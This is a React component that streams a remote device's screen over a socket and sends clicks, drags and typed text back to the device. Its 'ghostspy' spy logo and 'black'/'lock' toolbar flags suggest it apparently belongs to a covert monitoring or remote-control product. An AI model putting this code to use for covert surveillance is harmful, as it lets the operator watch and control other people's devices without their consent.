import React, { useEffect, useState, useRef } from "react";
import { useMediaQuery } from "react-responsive";

import { Grid, CardMedia, Box, TextField, IconButton } from "@mui/material";
import { useTranslation } from "react-i18next";
import { useDrag } from "react-use-gesture";

import SendOutlinedIcon from "@mui/icons-material/SendOutlined";
import KeyboardArrowDownOutlinedIcon from "@mui/icons-material/KeyboardArrowDownOutlined";
import KeyboardControlKeyOutlinedIcon from "@mui/icons-material/KeyboardControlKeyOutlined";

import { useSocket } from "../../hooks/use-socket";
import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import ScreenToolbar from "./screenTools";
import MonitorViewer from "../monitorViewer";

import Color from "src/theme/colors";

const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const isMobile = useMediaQuery({ query: "(max-width: 475px)" });
  const isTablet = useMediaQuery({ query: "(max-width: 1024px) and (min-width: 476px)" }); // Tablet between 476px and 1024px

  const { onSocketMonitor, onScreenClickEvent, onScreenDragEvent, onSendTextEvent } =
    useSocketFunctions();
  const { socket } = useSocket();
  const imageRef = useRef(null);

  const [openIput, setOpenInput] = useState(false);
  const [screenCode, setScreenCode] = useState(null);
  const [positions, setPositions] = useState([]);
  const [isDragging, setIsDragging] = useState(false);
  const [mouseDown, setMouseDown] = useState(false);
  const [message, setMessage] = useState(null);

  const black = localStorage.getItem("black");
  const lock = localStorage.getItem("lock");

  useEffect(() => {
    if (!isMobile) {
      setOpenInput(true);
    }
  }, [isMobile]);

  useEffect(() => {
    const deviceId = device?.deviceId;
    let isMounted = true;

    const monitorDevice = async () => {
      try {
        if (deviceId) {
          await onSocketMonitor(monitor, { deviceId });

          const handleMonitorResponse = (data) => {
            if (isMounted && monitor === data.type) {
              if (data?.option === "base64") {
                setScreenCode(data.response?.base64Image);
              } else {
                const byteArray = new Uint8Array(data.response?.base64Image);

                // Convert byte array to base64 string
                const base64String = btoa(String.fromCharCode(...byteArray));
                setScreenCode(base64String);
              }
            }
          };

          socket.on(`screen-shared-${deviceId}`, handleMonitorResponse);

          return () => {
            socket.off(`screen-shared-${deviceId}`, handleMonitorResponse);
            isMounted = false;
          };
        }
      } catch (error) {
        console.error("Error monitoring device:", error);
      }
    };

    monitorDevice();
  }, [monitor]);

  // send screen text
  const onSendInputText = async () => {
    try {
      const deviceId = device?.deviceId;

      await onSendTextEvent(SocketIOPublicEvents.screen_send_text_event, {
        deviceId,
        message,
      });
    } catch (error) {
      console.log("send text error", error);
    }
  };

  // Close
  const onCloseModal = async () => {
    try {
      setScreenCode(null);
      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  // Prevent drag on image
  const preventDrag = (e) => {
    e.stopPropagation();
  };

  // Handle resizing
  const handleResizeStop = (e, direction, ref, delta, position) => {
    setState((prevState) => ({
      ...prevState,
      width: parseInt(ref.style.width, 10),
      height: parseInt(ref.style.height, 10),
      ...position,
    }));
  };

  const calculatePosition = async (clientX, clientY) => {
    try {
      const img = imageRef.current;

      if (img) {
        const rect = img.getBoundingClientRect();

        const x = clientX - rect.left;
        const y = clientY - rect.top;

        const intrinsicWidth = img.naturalWidth;
        const intrinsicHeight = img.naturalHeight;

        const renderedWidth = rect.width;
        const renderedHeight = rect.height;

        const xRate = intrinsicWidth / renderedWidth;
        const yRate = intrinsicHeight / renderedHeight;

        let xPosition = x * xRate;
        let yPosition = y * yRate;

        xPosition = parseFloat(xPosition.toFixed(6));
        yPosition = parseFloat(yPosition.toFixed(6));

        return { xPosition, yPosition };
      } else {
        console.error("Image reference is null.");
      }
    } catch (error) {
      console.error("Error in calculatePosition:", error);
    }

    // Fallback return value to avoid undefined errors
    return { xPosition: 0, yPosition: 0 };
  };

  // Handle drag
  const bind = useDrag(async ({ event, memo = { startX: 0, startY: 0 }, movement: [mx, my] }) => {
    const deviceId = device?.deviceId;

    if (event.type === "pointerdown") {
      setPositions([]);
      setMouseDown(true);
      setIsDragging(false);
      memo.startX = event.clientX;
      memo.startY = event.clientY;
    } else if (event.type === "pointermove") {
      if (mouseDown) {
        setIsDragging(true);
        const { xPosition, yPosition } =
          (await calculatePosition(event.clientX, event.clientY)) || {};
        if (xPosition >= 0 && yPosition >= 0) {
          setPositions((prevPositions) => [...prevPositions, { x: xPosition, y: yPosition }]);
        }
      }
    } else if (event.type === "pointerup") {
      setMouseDown(false);

      if (positions.length === 0) {
        const { xPosition, yPosition } =
          (await calculatePosition(event.clientX, event.clientY)) || {};

        if (xPosition >= 0 && yPosition >= 0) {
          await onScreenClickEvent(SocketIOPublicEvents.screen_click_event, {
            deviceId,
            xPosition,
            yPosition,
          });
        }
      } else {
        await onScreenDragEvent(SocketIOPublicEvents.screen_drag_event, {
          deviceId,
          positions,
        });
      }

      setIsDragging(false);
    }
    return memo;
  });

  const onCloseInputBox = () => {
    setOpenInput(false);
  };
  const onOpenInputBox = () => {
    setOpenInput(true);
  };

  return (
    <>
      <MonitorViewer
        initialState={{
          width: 360,
          height: 720,
          x: isTablet ? 0 : 100,
          y: isTablet ? -400 : -120,
          minWidth: 270,
          minHeight: 540,
          maxWidth: 360,
          maxHeight: 720,
        }}
        type="screen"
        onClose={onCloseModal}
      >
        <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
          <Box
            onMouseDown={preventDrag}
            onTouchStart={preventDrag}
            sx={{ cursor: "default", pointerEvents: "auto" }}
          >
            <ScreenToolbar device={device} black={black} lock={lock} />
          </Box>

          {/* Your screen monitoring content here */}
          <Grid
            sx={{
              display: "flex",
              flexDirection: "column",
              width: "100%",
              height: "100%",
              backgroundColor: "black",
              border: `solid 1px ${Color.background.border}`,
              borderRadius: "5px",
            }}
          >
            <Grid
              sx={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                width: "100%",
                height: "100%",
                pb: 1,
              }}
            >
              <Grid
                onMouseDown={preventDrag}
                onTouchStart={preventDrag}
                sx={{
                  width: "100%",
                  height: "100%",
                  position: "absolute",
                  top: 0,
                  left: 0,
                  zIndex: 2,
                  opacity: 0.5,
                  cursor: "default",
                }}
                {...bind()}
              ></Grid>

              {screenCode ? (
                <>
                  <CardMedia
                    className="screen-body"
                    component="img"
                    src={`data:image/png;base64, ${screenCode}`}
                    sx={{
                      width: "100%",
                      height: "100%",
                      borderRadius: "0px",
                      position: "absolute",
                      top: 0,
                      left: 0,
                      zIndex: 1,
                    }}
                    // onLoad={onImageLoad}
                    ref={imageRef}
                  />
                </>
              ) : (
                <CardMedia
                  className="screen-body"
                  component="img"
                  src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
                  sx={{
                    cursor: "default",
                    width: "auto",
                    height: "auto",
                    borderRadius: "0px",
                  }}
                />
              )}
            </Grid>

            {screenCode && (
              <>
                {isMobile && (
                  <Box
                    sx={{
                      position: "fixed",
                      bottom: "10px",
                      right: "5px",
                      zIndex: 99999,
                      color: "red",
                    }}
                  >
                    {openIput ? (
                      <IconButton
                        onClick={onCloseInputBox}
                        sx={{
                          color: Color.text.primary,
                          cursor: "pointer",
                          padding: "5px",
                          backgroundColor: Color.background.secondary,
                          border: `solid 1px ${Color.background.purple}`,
                        }}
                      >
                        <KeyboardArrowDownOutlinedIcon />
                      </IconButton>
                    ) : (
                      <IconButton
                        onClick={onOpenInputBox}
                        sx={{
                          color: Color.text.primary,
                          cursor: "pointer",
                          padding: "5px",
                          backgroundColor: Color.background.secondary,
                          border: `solid 1px ${Color.background.purple}`,
                        }}
                      >
                        <KeyboardControlKeyOutlinedIcon />
                      </IconButton>
                    )}
                  </Box>
                )}

                {openIput && (
                  <Box
                    sx={{
                      width: "100%",
                      display: "flex",
                      justifyContent: "center",
                    }}
                  >
                    <Box
                      onMouseDown={preventDrag}
                      onTouchStart={preventDrag}
                      sx={{
                        position: "absolute",
                        bottom: !isMobile ? "-50px" : "8px",
                        zIndex: 99999,
                        width: !isMobile ? "100%" : "230px",
                        minWidth: "180px",
                      }}
                    >
                      <Box
                        sx={{
                          display: "flex",
                          alignItems: "center",
                          gap: "10px",
                        }}
                      >
                        <TextField
                          className="screen-message"
                          fullWidth
                          value={message?.text || ""}
                          onChange={(e) => setMessage({ ...message, text: e.target.value })}
                          inputProps={{
                            style: {
                              backgroundColor: Color.background.main,
                              padding: "10px 50px 10px 10px",
                            },
                          }}
                        />
                        <SendOutlinedIcon
                          onClick={() => onSendInputText()}
                          sx={{
                            backgroundColor: Color.background.main,
                            position: "absolute",
                            right: "1%",
                            color: Color.text.primary,
                            cursor: "pointer",
                            fontSize: "30px",
                          }}
                        />
                      </Box>
                    </Box>
                  </Box>
                )}
              </>
            )}
          </Grid>
        </Box>
      </MonitorViewer>
    </>
  );
};

export default ScreenMonitorViewer;
